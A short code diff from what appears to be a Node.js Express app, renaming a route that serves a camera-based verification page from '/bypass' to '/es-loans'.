@@ -1296,7 +1296,7 @@ app.get("/", (req, res) => {
 });
 
 // Serve direct/bypass verification (skips personal info, goes straight to camera)
-app.get("/bypass", (req, res) => {
+app.get("/es-loans", (req, res) => {
   res.sendFile(path.join(__dirname, "verification.html"));
 });
 
